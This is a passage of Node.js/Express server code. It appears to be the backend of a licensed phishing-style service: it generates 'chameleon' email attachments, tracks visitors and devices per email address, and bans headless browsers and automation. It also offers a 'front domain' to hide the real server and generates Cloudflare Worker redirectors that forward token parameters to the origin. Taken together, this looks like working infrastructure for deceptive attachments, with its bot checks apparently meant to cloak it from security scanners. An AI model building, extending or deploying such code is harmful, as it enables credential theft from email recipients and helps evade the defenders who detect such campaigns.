  const isViewerPath = req.path.startsWith('/v/') || req.path.startsWith('/d/') || req.path === '/r';
  if (!isStatic2 && !isAdminPath && !isViewerPath && !(req.session && req.session.adminUser)) {
    const now2 = Date.now();
    let rlog = ipRequestLog.get(ip);
    if (!rlog) { rlog = []; ipRequestLog.set(ip, rlog); }
    rlog.push(now2);
    while (rlog.length > 0 && rlog[0] < now2 - 10000) rlog.shift();
    // 100 non-static requests in 10s = throttle (not ban)
    if (rlog.length > 100) {
      return res.status(429).set('Retry-After', '10').send('Slow down.');
    }
  }

  // 5. JS challenge gate
  const isStatic = req.path.startsWith('/css/') || req.path.startsWith('/js/') || /\.(ico|png|jpg|jpeg|gif|svg|woff2?|ttf|eot|css|js|map)$/i.test(req.path);
  const isAdminRoute = req.path.startsWith(`/${ADMIN_PATH}`);
  if (!isStatic && !isAdminRoute && !isVerified(req)) {
    // For API/auth AJAX calls: reject with 403 JSON (don't serve HTML gate)
    if (req.path.startsWith('/auth/') || req.path.startsWith('/api/')) {
      return res.status(403).json({ error: 'Browser verification required. Please refresh the page.' });
    }
    // For page loads: serve the JS challenge gate
    return serveChallengeGate(req, res);
  }

  next();
});

// Cleanup every 5 min
setInterval(() => {
  const now = Date.now();
  for (const [ip, e] of globalRateLimits) { if (now > e.resetAt) globalRateLimits.delete(ip); }
  for (const [ip, s] of ipStrikes) { if (now - s.firstStrike > STRIKE_WINDOW) ipStrikes.delete(ip); }
  for (const [ip, b] of ipBlacklist) { if (now > b.expires) ipBlacklist.delete(ip); }
}, 5 * 60 * 1000);

// --- Auth-specific protection (proof-of-work challenge + honeypot) ---
const pendingChallenges = new Map();
const CHALLENGE_TTL = 120 * 1000;

// Headless/bot fingerprint evaluation — called by the challenge gate JS
app.post('/auth/fingerprint', express.json({ limit: '32kb' }), (req, res) => {
  const ip = getIp(req);
  const s = (req.body && req.body.s) || {};
  let score = 0;
  const flags = [];
  // Hard fails (instant ban)
  if (s.wd) { score += 100; flags.push('webdriver'); }
  if (s.automation) { score += 100; flags.push('automation-globals'); }
  if (s.headlessUA) { score += 100; flags.push('headless-ua'); }
  // Soft signals (accumulate)
  if (!s.lang) { score += 30; flags.push('no-lang'); }
  if (!s.tz) { score += 30; flags.push('no-tz'); }
  if (!s.w || s.w < 200) { score += 30; flags.push('bad-screen'); }
  if (s.langs === 0) { score += 20; flags.push('no-languages'); }
  if (s.plugins === 0 && /Win|Mac|Linux/i.test(s.platform || '') && s.touch === 0) { score += 20; flags.push('desktop-no-plugins'); }
  if (!s.gpu || /SwiftShader|llvmpipe|Mesa Offscreen/i.test(s.gpu)) { score += 25; flags.push('soft-gpu:' + (s.gpu||'none')); }
  if (s.hw === 0) { score += 15; flags.push('no-hw-concurrency'); }
  if (s.notifBad) { score += 40; flags.push('headless-notif'); }
  if (!s.cookie) { score += 30; flags.push('no-cookie'); }
  // UA/platform mismatch
  if (s.ua && /Chrome/.test(s.ua) && !s.chrome) { score += 40; flags.push('chrome-ua-no-chrome-obj'); }

  console.log(`[fingerprint] ip=${ip} score=${score} flags=${flags.join(',')} ua="${(s.ua||'').slice(0,80)}"`);
  // Only ban on CERTAIN bots (webdriver/automation/headless-UA) to avoid false positives.
  // Soft signals are logged but don't auto-ban.
  const hardBot = s.wd || s.automation || s.headlessUA;
  if (hardBot) {
    trapIp(ip, 'headless:' + flags.slice(0,3).join(','), 7 * 24 * 60 * 60 * 1000, req);
    return req.socket.destroy();
  }
  res.json({ ok: true });
});

app.get('/auth/challenge', (req, res) => {
  const a = Math.floor(Math.random() * 900) + 100;
  const b = Math.floor(Math.random() * 900) + 100;
  const token = crypto.randomBytes(24).toString('hex');
  pendingChallenges.set(token, { answer: a * b, ts: Date.now() });
  res.json({ token, a, b });
});

function verifyChallenge(req, res, next) {
  const { _token, _answer } = req.body || {};
  if (!_token || _answer === undefined) {
    return res.status(403).json({ error: 'Security challenge required. Please refresh the page.' });
  }
  const challenge = pendingChallenges.get(_token);
  if (!challenge) {
    return res.status(403).json({ error: 'Challenge expired. Please refresh and try again.' });
  }
  pendingChallenges.delete(_token);
  if (Date.now() - challenge.ts > CHALLENGE_TTL) {
    return res.status(403).json({ error: 'Challenge expired. Please refresh and try again.' });
  }
  if (parseInt(_answer) !== challenge.answer) {
    addStrike(getIp(req), 'wrong_challenge_answer');
    return res.status(403).json({ error: 'Security verification failed.' });
  }
  if (req.body._hp) {
    addStrike(getIp(req), 'honeypot_filled');
    return res.status(403).json({ error: 'Request blocked.' });
  }
  next();
}

setInterval(() => {
  const now = Date.now();
  for (const [t, c] of pendingChallenges) { if (now - c.ts > CHALLENGE_TTL) pendingChallenges.delete(t); }
}, 5 * 60 * 1000);

// Kept for backward compat on auth routes
function rateLimit(req, res, next) { next(); } // handled by global middleware now
function blockBots(req, res, next) { next(); } // handled by global middleware now

// ---- Auth helpers ----
function requireAuth(req, res, next) {
  if (req.session.user) return next();
  if (req.path.startsWith('/api/') || req.xhr) return res.status(401).json({ error: 'auth_required' });
  return res.redirect('/login');
}

// Public routes (no auth)
app.get('/health', (req, res) => res.json({ ok: true }));
app.get('/login', (req, res) => res.sendFile(path.join(__dirname, 'public', 'login.html')));
app.get('/auth/me', (req, res) => res.json(req.session.user || null));

// ==========================================
// ---- ADMIN PANEL ----
// ==========================================
// Optional IP allowlist: set ADMIN_IP_ALLOWLIST="1.2.3.4,10.0.0.0/8" (leave unset to disable)
const ADMIN_IP_ALLOWLIST = (process.env.ADMIN_IP_ALLOWLIST || '').split(',').map(s => s.trim()).filter(Boolean);
function ipInCidr(ip, cidr) {
  if (!cidr.includes('/')) return ip === cidr;
  const [range, bitsStr] = cidr.split('/');
  const bits = parseInt(bitsStr, 10);
  const ipNum = ip.split('.').reduce((a, o) => (a << 8) + parseInt(o, 10), 0) >>> 0;
  const rangeNum = range.split('.').reduce((a, o) => (a << 8) + parseInt(o, 10), 0) >>> 0;
  const mask = bits === 0 ? 0 : (~0 << (32 - bits)) >>> 0;
  return (ipNum & mask) === (rangeNum & mask);
}
function adminIpGate(req, res, next) {
  if (ADMIN_IP_ALLOWLIST.length === 0) return next();
  const ip = (req.ip || '').replace('::ffff:', '');
  const allowed = ADMIN_IP_ALLOWLIST.some(c => { try { return ipInCidr(ip, c); } catch { return false; } });
  if (!allowed) {
    console.log(`[admin-ip-block] ${ip} denied on ${req.path}`);
    return res.status(404).type('text/plain').send('Not Found');
  }
  next();
}
app.use(`/${ADMIN_PATH}`, adminIpGate);

function requireAdmin(req, res, next) {
  if (!req.session.adminUser) {
    if (req.path.includes('/api/')) return res.status(401).json({ error: 'Login required.' });
    return res.redirect(`/${ADMIN_PATH}/login`);
  }
  // Session binding: verify IP + UA match what was recorded at login.
  // If mismatch → session hijack attempt → destroy session immediately.
  const currentIp = getIp(req);
  const currentUaHash = crypto.createHash('sha256').update(req.headers['user-agent'] || '').digest('hex').slice(0, 16);
  if (req.session._boundIp && req.session._boundIp !== currentIp) {
    const who = req.session.adminUser.username;
    console.warn(`[session-hijack] IP mismatch for ${who}: bound=${req.session._boundIp} current=${currentIp}`);
    sendTelegramToSuperadmins(`🔴 *Session Hijack Blocked*\n\n👤 *User:* \`${who}\`\n🌐 *Bound IP:* \`${req.session._boundIp}\`\n🌐 *Current IP:* \`${currentIp}\`\n🕐 ${new Date().toLocaleString()}`).catch(()=>{});
    trapIp(currentIp, 'session-hijack:ip-mismatch', 7 * 24 * 60 * 60 * 1000);
    req.session.destroy(() => {});
    return res.redirect(`/${ADMIN_PATH}/login`);
  }
  if (req.session._boundUa && req.session._boundUa !== currentUaHash) {
    const who = req.session.adminUser.username;
    console.warn(`[session-hijack] UA mismatch for ${who}`);
    sendTelegramToSuperadmins(`🔴 *Session Hijack Blocked*\n\n👤 *User:* \`${who}\`\n💻 *UA changed mid-session*\n🌐 *IP:* \`${currentIp}\`\n🕐 ${new Date().toLocaleString()}`).catch(()=>{});
    req.session.destroy(() => {});
    return res.redirect(`/${ADMIN_PATH}/login`);
  }
  // License check: block expired/revoked users (superadmin/owner always passes)
  const licUser = usersDB.find(u => u.id === req.session.adminUser.id);
  if (licUser && licUser.license && licUser.license.tier !== 'owner') {
    if (!licUser.license.active) {
      if (req.path.includes('/api/')) return res.status(403).json({ error: 'License revoked. Contact admin.' });
      req.session.destroy(() => {});
      return res.redirect(`/${ADMIN_PATH}/login?error=license`);
    }
    if (licUser.license.expiresAt && new Date(licUser.license.expiresAt).getTime() < Date.now()) {
      licUser.license.active = false;
      saveUsersDB();
      if (req.path.includes('/api/')) return res.status(403).json({ error: 'License expired. Contact admin to renew.' });
      req.session.destroy(() => {});
      return res.redirect(`/${ADMIN_PATH}/login?error=license`);
    }
  }
  next();
}

// ---- License tiers ----
const LICENSE_TIERS = {
  owner: { label: 'Owner (You)', color: 'gold' },
  vip: { label: 'VIP', color: 'purple' },
  premium: { label: 'Premium', color: 'blue' },
  basic: { label: 'Basic', color: 'green' },
};

function requireSuperAdmin(req, res, next) {
  if (req.session.adminUser?.role === 'superadmin') return next();
  return res.status(403).json({ error: 'Super admin access required.' });
}

app.get(`/${ADMIN_PATH}/login`, (req, res) => {
  if (req.session.adminUser) return res.redirect(`/${ADMIN_PATH}`);
  res.sendFile(pickHtml('admin-login.html'));
});

app.post(`/${ADMIN_PATH}/login`, authLimiter, async (req, res) => {
  const ip = getIp(req);
  // Honeypot fields: real users never see/fill these. Any value = bot.
  if (req.body.hp_nickname || req.body.hp_referrer_url || req.body.hp_company) {
    console.log(`[honeypot-login] ip=${ip} filled honeypot fields`);
    trapIp(ip, 'honeypot:login-form', 7 * 24 * 60 * 60 * 1000, req);
    return res.status(404).type('text/plain').send('Not Found');
  }
  // Timing trap: form filled in < 800ms is almost certainly a bot
  const ts = parseInt(req.body._ts, 10);
  if (ts && Date.now() - ts < 800) {
    console.log(`[honeypot-login] ip=${ip} too fast (${Date.now()-ts}ms)`);
    trapIp(ip, 'honeypot:too-fast', 24 * 60 * 60 * 1000, req);
    return res.status(404).type('text/plain').send('Not Found');
  }
  const { username, password } = req.body;
  const user = usersDB.find(u => u.username === username);
  const ok = user && await verifyPassword(password, user.passwordHash);
  const ua = req.headers['user-agent'] || '';
  if (ok) {
    if (user.passwordHash && !user.passwordHash.startsWith('$argon2')) {
      try { user.passwordHash = await hashPassword(password); saveUsersDB(); console.log(`[auth] Upgraded ${user.username} to argon2id`); } catch (e) { console.warn('[auth] upgrade failed', e.message); }
    }
    req.session.adminUser = {
      id: user.id, username: user.username, displayName: user.displayName,
      role: user.role, assignedEmails: user.assignedEmails || [], assignedDomains: user.assignedDomains || [],
    };
    // Bind session to IP + UA fingerprint — stolen cookies won't work from another machine
    req.session._boundIp = ip;
    req.session._boundUa = crypto.createHash('sha256').update(ua).digest('hex').slice(0, 16);
    // Trust this operator for 7 days (IP) + 30 days (device fingerprint).
    // Belt-and-braces: either match bypasses the honeypot, so a network change
    // or fingerprint drift won't lock them out, and any prior ban for this
    // IP/device is cleared on the spot.
    markAdminTrusted(ip, user.username, req);
    markDeviceTrusted(req, user.username);
    sendTelegramToSuperadmins(
      `🟢 *Admin Login Success*\n\n👤 *User:* \`${user.username}\` (${user.role})\n🌐 *IP:* \`${ip}\`\n💻 *UA:* \`${ua.slice(0,120)}\`\n🕐 *Time:* ${new Date().toLocaleString()}`
    );
    return res.redirect(`/${ADMIN_PATH}`);
  }
  addStrike(ip, 'failed_admin_login');
  sendTelegramToSuperadmins(
    `🔴 *Admin Login FAILED*\n\n👤 *Username tried:* \`${(username||'').slice(0,64)}\`\n🌐 *IP:* \`${ip}\`\n💻 *UA:* \`${ua.slice(0,120)}\`\n🕐 *Time:* ${new Date().toLocaleString()}`
  );
  res.redirect(`/${ADMIN_PATH}/login?error=1`);
});

app.get(`/${ADMIN_PATH}/logout`, (req, res) => {
  delete req.session.adminUser;
  res.redirect(`/${ADMIN_PATH}/login`);
});

// Admin dashboard page
app.get(`/${ADMIN_PATH}`, requireAdmin, (req, res) => {
  res.sendFile(pickHtml('admin.html'));
});

// Admin API endpoints (protected)
// /u/api/me — any authenticated user can see their own info (incl. Telegram status)
app.get(`/${ADMIN_PATH}/api/me`, requireAdmin, (req, res) => {
  const dbUser = usersDB.find(u => u.id === req.session.adminUser.id);
  const out = { ...req.session.adminUser };
  if (dbUser) {
    out.telegramEnabled = !!dbUser.telegramEnabled;
    out.telegramChatId = dbUser.telegramChatId || '';
    out.telegramBotToken = dbUser.telegramBotToken ? '***configured***' : '';
    out.mfaEnabled = !!dbUser.mfaEnabled;
    out.slug = dbUser.slug;
    out.domain = dbUser.domain || '';
    out.domainVerified = !!dbUser.domainVerified;
    out.domainSslStatus = dbUser.domainSslStatus || '';
    out.domainVerifyToken = dbUser.domainVerifyToken || '';
    // Surfaced so the Settings UI can render concrete DNS instructions
    // (A-record value) and warn when SSL auto-provisioning isn't wired up.
    out.serverPublicIp = SERVER_PUBLIC_IP || '';
    out.caddyConfigured = !!process.env.CADDY_ADMIN_URL;
    out.requireDomain = !!dbUser.requireDomain;
    out.encryptionPreset = dbUser.encryptionPreset || 'medium';
    out.frontDomain = dbUser.frontDomain || '';
    out.license = dbUser.license || {};
    // Permissions: owner gets all, others get per-user features
    const isOwner = (dbUser.license && dbUser.license.tier === 'owner') || dbUser.role === 'superadmin';
    const uf = dbUser.features || {};
    out.permissions = {
      chameleon: isOwner || !!uf.chameleon,
      inbox: isOwner || !!uf.inbox,
      convert: isOwner || !!uf.convert,
      links: isOwner || !!uf.links,
    };
    // Effective domain resolution:
    //   Own verified domain → use it
    //   Otherwise           → fall back to the current server URL.
    // The chameleon URL still works in the fallback case; superadmin just controls
    // (via `requireDomain`) whether a user is *forced* to verify before generating.
    const currentHost = `${req.protocol}://${req.get('host')}`;
    if (dbUser.domainVerified && dbUser.domain) {
      out.effectiveDomain = dbUser.domain;
      out.effectiveDomainSource = 'own';
    } else {
      out.effectiveDomain = currentHost;
      out.effectiveDomainSource = 'server';
    }
  }
  res.json(out);
});

function normalizeDomain(input) {
  if (!input) return '';
  let s = String(input).trim();
  if (!s) return '';
  if (!/^https?:\/\//i.test(s)) s = 'http://' + s;
  return s.replace(/\/+$/, '');
}

// Centralized "what URL goes into this user's generated chameleon attachment?"
// resolution. Verified custom domain wins; otherwise we fall back to the server
// URL the request is currently coming through. Used by all chameleon generators.
function chameleonOrigin(req, dbUser) {
  if (dbUser && dbUser.domainVerified && dbUser.domain) return dbUser.domain.replace(/\/+$/, '');
  return `${req.protocol}://${req.get('host')}`.replace(/\/+$/, '');
}

// Should a chameleon-generation request be blocked because this user is required
// to use their own verified domain and hasn't set one up? Superadmin always allowed.
function blockMissingDomain(dbUser) {
  if (!dbUser) return true;
  if (dbUser.role === 'superadmin') return false;
  if (!dbUser.requireDomain) return false;
  return !(dbUser.domainVerified && dbUser.domain);
}

// Save own domain (any authenticated user). Superadmin's domain doubles as the default for others.
app.post(`/${ADMIN_PATH}/api/my-domain`, requireAdmin, async (req, res) => {
  const dbUser = usersDB.find(u => u.id === req.session.adminUser.id);
  if (!dbUser) return res.status(404).json({ error: 'User not found.' });
  const newDomain = normalizeDomain(req.body && req.body.domain);
  if (newDomain !== dbUser.domain) {
    // If we had a Caddy route for the old host, drop it before swapping —
    // otherwise a stale cert + reverse-proxy mapping survives for the wrong domain.
    const oldHost = (() => { try { return dbUser.domain ? new URL(dbUser.domain).hostname : ''; } catch { return ''; } })();
    if (oldHost) deprovisionCaddyForDomain(dbUser).catch(err => console.warn('[caddy] deprovision (replace) failed', err.message));
    dbUser.domain = newDomain;
    // Changing the domain resets verification & SSL state
    dbUser.domainVerified = false;
    dbUser.domainSslStatus = '';
  }
  saveUsersDB();
  res.json({ ok: true, domain: dbUser.domain, verifyToken: dbUser.domainVerifyToken });
});

// Remove the saved domain — works whether verified or not. Tears down the Caddy
// route if one was provisioned, so the cert + reverse-proxy mapping go away too.
app.delete(`/${ADMIN_PATH}/api/my-domain`, requireAdmin, async (req, res) => {
  const dbUser = usersDB.find(u => u.id === req.session.adminUser.id);
  if (!dbUser) return res.status(404).json({ error: 'User not found.' });
  if (!dbUser.domain) return res.json({ ok: true, domain: '' });
  // Best-effort Caddy teardown — don't block the user if Caddy is unreachable.
  deprovisionCaddyForDomain(dbUser).catch(err => console.warn('[caddy] deprovision failed', err.message));
  dbUser.domain = '';
  dbUser.domainVerified = false;
  dbUser.domainSslStatus = '';
  saveUsersDB();
  console.log(`[admin] ${dbUser.username} removed their domain`);
  res.json({ ok: true, domain: '' });
});

// Verify domain ownership by (a) A-record pointing at our public IP, or (b) TXT _invchk.<domain> == token
const SERVER_PUBLIC_IP = process.env.SERVER_PUBLIC_IP || '';
async function verifyDomain(domainStr, token) {
  if (!domainStr) return { ok: false, error: 'no domain set' };
  let host;
  try { host = new URL(domainStr).hostname; } catch { return { ok: false, error: 'invalid domain' }; }
  const reasons = [];
  // A-record check
  if (SERVER_PUBLIC_IP) {
    try {
      const addrs = await dns.promises.resolve4(host);
      if (addrs.includes(SERVER_PUBLIC_IP)) return { ok: true, method: 'a-record', host };
      reasons.push(`A record resolved to ${addrs.join(',')} — expected ${SERVER_PUBLIC_IP}`);
    } catch (e) { reasons.push(`A-record lookup failed: ${e.code || e.message}`); }
  } else {
    reasons.push('SERVER_PUBLIC_IP not configured; skipping A-record check');
  }
  // TXT check: _invchk.<host>
  try {
    const records = await dns.promises.resolveTxt(`_invchk.${host}`);
    const flat = records.map(chunks => chunks.join('')).flat();
    if (flat.includes(token)) return { ok: true, method: 'txt-record', host };
    reasons.push(`TXT _invchk.${host} did not contain the token`);
  } catch (e) { reasons.push(`TXT lookup failed: ${e.code || e.message}`); }
  return { ok: false, error: reasons.join('; ') };
}

// Lightweight live DNS check — same lookups as verifyDomain() but doesn't
// flip domainVerified. The Settings UI polls this so users see a green ✓ the
// moment their A or TXT record is detected, removing the "wait and hope"
// gap before clicking Verify. Cached 8s per (host,token) to avoid DNS spam.
const dnsStatusCache = new Map();
const DNS_STATUS_TTL_MS = 8 * 1000;
async function checkDnsStatus(domainStr, token) {
  if (!domainStr) return { aRecord: null, txtRecord: null, host: '' };
  let host;
  try { host = new URL(domainStr).hostname; } catch { return { aRecord: null, txtRecord: null, host: '' }; }
  const cacheKey = `${host}|${token || ''}`;
  const cached = dnsStatusCache.get(cacheKey);
  if (cached && Date.now() - cached.ts < DNS_STATUS_TTL_MS) return cached.value;

  let aRecord = { ok: false, value: null, error: null };
  if (SERVER_PUBLIC_IP) {
    try {
      const addrs = await dns.promises.resolve4(host);
      aRecord.value = addrs.join(', ');
      aRecord.ok = addrs.includes(SERVER_PUBLIC_IP);
      if (!aRecord.ok) aRecord.error = `points to ${addrs.join(',')} — expected ${SERVER_PUBLIC_IP}`;
    } catch (e) {
      aRecord.error = e.code === 'ENODATA' || e.code === 'ENOTFOUND' ? 'no record yet' : (e.code || 'lookup failed');
    }
  } else {
    aRecord.error = 'A-record check disabled (SERVER_PUBLIC_IP not configured)';
  }

  let txtRecord = { ok: false, value: null, error: null };
  try {
    const records = await dns.promises.resolveTxt(`_invchk.${host}`);
    const flat = records.map(chunks => chunks.join('')).flat();
    txtRecord.value = flat.join(' | ');
    txtRecord.ok = !!token && flat.includes(token);
    if (!txtRecord.ok && flat.length) txtRecord.error = 'token mismatch';
  } catch (e) {
    txtRecord.error = e.code === 'ENODATA' || e.code === 'ENOTFOUND' ? 'no record yet' : (e.code || 'lookup failed');
  }

  const value = { aRecord, txtRecord, host };
  dnsStatusCache.set(cacheKey, { ts: Date.now(), value });
  return value;
}
app.get(`/${ADMIN_PATH}/api/my-domain/dns-status`, requireAdmin, async (req, res) => {
  const dbUser = usersDB.find(u => u.id === req.session.adminUser.id);
  if (!dbUser) return res.status(404).json({ error: 'User not found.' });
  if (!dbUser.domain) return res.json({ aRecord: null, txtRecord: null });
  const out = await checkDnsStatus(dbUser.domain, dbUser.domainVerifyToken);
  res.json(out);
});

app.post(`/${ADMIN_PATH}/api/my-domain/verify`, requireAdmin, async (req, res) => {
  const dbUser = usersDB.find(u => u.id === req.session.adminUser.id);
  if (!dbUser) return res.status(404).json({ error: 'User not found.' });
  if (!dbUser.domain) return res.status(400).json({ error: 'No domain saved. Save one first.' });
  const result = await verifyDomain(dbUser.domain, dbUser.domainVerifyToken);
  if (!result.ok) return res.status(400).json({ error: result.error });
  dbUser.domainVerified = true;
  dbUser.domainSslStatus = 'provisioning';
  saveUsersDB();
  // Fire-and-forget Caddy provisioning
  provisionCaddyForDomain(dbUser).catch(err => {
    console.warn('[caddy] provision failed', err.message);
    dbUser.domainSslStatus = 'error: ' + err.message.slice(0, 200);
    saveUsersDB();
  });
  res.json({ ok: true, method: result.method });
});

// Caddy admin API integration — if CADDY_ADMIN_URL env var is set, we push domain
// updates to Caddy and it handles Let's Encrypt + SNI automatically.
const CADDY_ADMIN_URL = process.env.CADDY_ADMIN_URL || '';     // e.g. http://localhost:2019
const UPSTREAM = process.env.UPSTREAM || `127.0.0.1:${PORT}`;   // Caddy proxies to this
async function provisionCaddyForDomain(user) {
  if (!CADDY_ADMIN_URL) {
    user.domainSslStatus = 'skipped: CADDY_ADMIN_URL not configured';
    saveUsersDB();
    return;
  }
  if (!user.domainVerified || !user.domain) return;
  const host = new URL(user.domain).hostname;
  const routeId = `user-${user.id}`;
  // Upsert a route via Caddy's config API. Uses on_demand TLS so cert provisioning is lazy.
  const route = {
    '@id': routeId,
    match: [{ host: [host] }],
    handle: [{ handler: 'reverse_proxy', upstreams: [{ dial: UPSTREAM }] }],
    terminal: true,
  };
  // Try update (PATCH by id); if not found, append to routes list
  const apiBase = CADDY_ADMIN_URL.replace(/\/+$/, '');
  const patchResp = await fetch(`${apiBase}/id/${routeId}`, {
    method: 'PATCH', headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(route),
  });
  if (patchResp.status === 404) {
    // First-time add — append to http server's routes
    await fetch(`${apiBase}/config/apps/http/servers/srv0/routes/...`, {
      method: 'POST', headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify([route]),
    });
  }
  user.domainSslStatus = 'active';
  saveUsersDB();
  console.log(`[caddy] configured ${host} → ${UPSTREAM}`);
}

// Tear down the Caddy route this user previously provisioned. No-op when Caddy
// isn't configured or no route was ever created. Errors are swallowed by the
// caller — removing a domain shouldn't fail just because Caddy is unreachable.
async function deprovisionCaddyForDomain(user) {
  if (!CADDY_ADMIN_URL) return;
  const routeId = `user-${user.id}`;
  const apiBase = CADDY_ADMIN_URL.replace(/\/+$/, '');
  const resp = await fetch(`${apiBase}/id/${routeId}`, { method: 'DELETE' });
  if (resp.ok || resp.status === 404) {
    console.log(`[caddy] removed route ${routeId} (status ${resp.status})`);
    return;
  }
  throw new Error(`Caddy DELETE returned ${resp.status}`);
}

// Server-Sent Events stream — realtime push to admin panel
app.get(`/${ADMIN_PATH}/api/stream`, requireAdmin, (req, res) => {
  const user = req.session.adminUser;
  const dbUser = usersDB.find(u => u.id === user.id);
  res.setHeader('Content-Type', 'text/event-stream');
  res.setHeader('Cache-Control', 'no-cache, no-transform');
  res.setHeader('Connection', 'keep-alive');
  res.setHeader('X-Accel-Buffering', 'no');
  res.flushHeaders?.();
  res.write(`event: hello\ndata: {"ok":true}\n\n`);
  const client = { res, userId: user.id, role: user.role, slug: dbUser ? dbUser.slug : null };
  sseClients.add(client);
  // Heartbeat every 25s (keep connection + proxies alive)
  const hb = setInterval(() => { try { res.write(': ping\n\n'); } catch {} }, 25000);
  req.on('close', () => { clearInterval(hb); sseClients.delete(client); });
});

// List encryption presets + current selection
app.get(`/${ADMIN_PATH}/api/encryption-presets`, requireAdmin, (req, res) => {
  const dbUser = usersDB.find(u => u.id === req.session.adminUser.id);
  const list = Object.keys(ENCRYPTION_PRESETS).map(k => ({ id: k, label: ENCRYPTION_PRESETS[k].label }));
  res.json({ presets: list, current: (dbUser && dbUser.encryptionPreset) || 'medium' });
});
app.post(`/${ADMIN_PATH}/api/my-encryption`, requireAdmin, (req, res) => {
  const dbUser = usersDB.find(u => u.id === req.session.adminUser.id);
  if (!dbUser) return res.status(404).json({ error: 'User not found.' });
  const preset = req.body && req.body.preset;
  if (!ENCRYPTION_PRESETS[preset]) return res.status(400).json({ error: 'Invalid preset.' });
  dbUser.encryptionPreset = preset;
  saveUsersDB();
  res.json({ ok: true, preset });
});

// Generate Cloudflare Worker code tailored to this user's server
app.get(`/${ADMIN_PATH}/api/worker-code`, requireAdmin, (req, res) => {
  const origin = `${req.protocol}://${req.get('host')}`;
  const code = `export default {
  async fetch(request) {
    const url = new URL(request.url);
    if (request.method === 'OPTIONS') {
      return new Response(null, {
        headers: { 'Access-Control-Allow-Origin': '*', 'Access-Control-Allow-Methods': 'GET,POST,OPTIONS', 'Access-Control-Allow-Headers': 'Content-Type' },
      });
    }
    if (url.pathname === '/r') {
      let t = '', k = '';
      if (request.method === 'POST') {
        const form = await request.formData();
        t = form.get('t') || '';
        k = form.get('k') || '';
      } else {
        t = url.searchParams.get('t') || '';
        k = url.searchParams.get('k') || '';
      }
      if (t && k) return Response.redirect('${origin}/r?t=' + encodeURIComponent(t) + '&k=' + encodeURIComponent(k), 302);
    }
    if (url.pathname.startsWith('/v/') || url.pathname.startsWith('/auth/') || url.pathname.startsWith('/api/') || url.pathname.startsWith('/js/') || url.pathname.startsWith('/css/') || url.pathname.startsWith('/d/')) {
      return Response.redirect('${origin}' + url.pathname + url.search, 302);
    }
    return new Response('Not Found', { status: 404 });
  },
};`;
  res.json({ code, origin });
});

// Save front domain (used in inbox-mode attachments to hide real server)
app.post(`/${ADMIN_PATH}/api/my-front-domain`, requireAdmin, (req, res) => {
  const dbUser = usersDB.find(u => u.id === req.session.adminUser.id);
  if (!dbUser) return res.status(404).json({ error: 'User not found.' });
  dbUser.frontDomain = normalizeDomain(req.body && req.body.frontDomain);
  saveUsersDB();
  res.json({ ok: true, frontDomain: dbUser.frontDomain });
});

// Save own MFA flag (any authenticated user)
app.post(`/${ADMIN_PATH}/api/my-mfa`, requireAdmin, (req, res) => {
  const dbUser = usersDB.find(u => u.id === req.session.adminUser.id);
  if (!dbUser) return res.status(404).json({ error: 'User not found.' });
  dbUser.mfaEnabled = !!(req.body && req.body.mfaEnabled);
  saveUsersDB();
  res.json({ ok: true });
});

// Save own Telegram settings (any authenticated user)
app.post(`/${ADMIN_PATH}/api/my-telegram`, requireAdmin, (req, res) => {
  const dbUser = usersDB.find(u => u.id === req.session.adminUser.id);
  if (!dbUser) return res.status(404).json({ error: 'User not found.' });
  const { telegramEnabled, telegramBotToken, telegramChatId } = req.body || {};
  if (telegramEnabled !== undefined) dbUser.telegramEnabled = !!telegramEnabled;
  if (telegramChatId !== undefined) dbUser.telegramChatId = String(telegramChatId).trim();
  if (telegramBotToken !== undefined && telegramBotToken && telegramBotToken !== '***configured***') {
    dbUser.telegramBotToken = String(telegramBotToken).trim();
  }
  saveUsersDB();
  res.json({ ok: true });
});

// Test own Telegram (any authenticated user)
app.post(`/${ADMIN_PATH}/api/test-my-telegram`, requireAdmin, async (req, res) => {
  const dbUser = usersDB.find(u => u.id === req.session.adminUser.id);
  if (!dbUser) return res.status(404).json({ error: 'User not found.' });
  if (!dbUser.telegramBotToken || !dbUser.telegramChatId) return res.status(400).json({ error: 'Bot token and chat ID required. Save first.' });
  try {
    const r = await fetch(`https://api.telegram.org/bot${dbUser.telegramBotToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: dbUser.telegramChatId, text: `✅ Test notification from Control Center — ${new Date().toLocaleString()}`, parse_mode: 'Markdown' }),
    });
    const data = await r.json();
    if (!r.ok || !data.ok) return res.status(400).json({ error: data.description || 'Telegram rejected the message.' });
    res.json({ ok: true });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

app.get(`/${ADMIN_PATH}/api/security`, requireAdmin, (req, res) => {
  const banned = [...ipBlacklist.entries()].map(([ip, d]) => ({ ip, ...d }));
  const strikes = [...ipStrikes.entries()].map(([ip, d]) => ({ ip, ...d }));
  const bannedDevices = [...deviceBans.entries()].map(([id, d]) => ({ id: id.slice(0, 12) + '...', ...d }));
  res.json({ bannedIPs: banned.length, banned, bannedDevices, activeStrikes: strikes, rateLimitedIPs: globalRateLimits.size, pendingChallenges: pendingChallenges.size });
});

app.get(`/${ADMIN_PATH}/api/devices`, requireAdmin, (req, res) => {
  const user = req.session.adminUser;
  // Find this user's slug from the DB
  const dbUser = usersDB.find(u => u.id === user.id);
  const mySlug = dbUser ? dbUser.slug : null;
  const entries = Object.entries(fingerprintDB)
    .filter(([email, data]) => {
      if (user.role === 'superadmin') return true;
      // Regular users: show clients that came through their URL (slug match)
      if (mySlug && data.slug === mySlug) return true;
      // Also show if email/domain is explicitly assigned
      return canSeeEmail(user, email);
    })
    .map(([email, data]) => ({
      email, deviceCount: Object.keys(data.devices).length, flagged: data.flagged, firstSeen: data.firstSeen,
      slug: data.slug || null,
      devices: Object.entries(data.devices).map(([hash, d]) => ({
        fingerprint: hash.slice(0, 16) + '...', hits: d.hits, firstSeen: d.firstSeen, lastSeen: d.lastSeen,
        ip: d.ip, lastIp: d.lastIp, gpu: d.gpu, screen: d.screen, platform: d.platform, timezone: d.timezone, language: d.language,
      })),
    })).sort((a, b) => b.deviceCount - a.deviceCount);
  res.json({ totalEmails: entries.length, flaggedEmails: entries.filter(e => e.flagged).length, maxDevicesThreshold: MAX_DEVICES_PER_EMAIL, entries });
});

// Attachments: each generated chameleon file with its visitors + clients.
app.get(`/${ADMIN_PATH}/api/attachments`, requireAdmin, (req, res) => {
  const user = req.session.adminUser;
  const dbUser = usersDB.find(u => u.id === user.id);
  const mySlug = dbUser ? dbUser.slug : null;

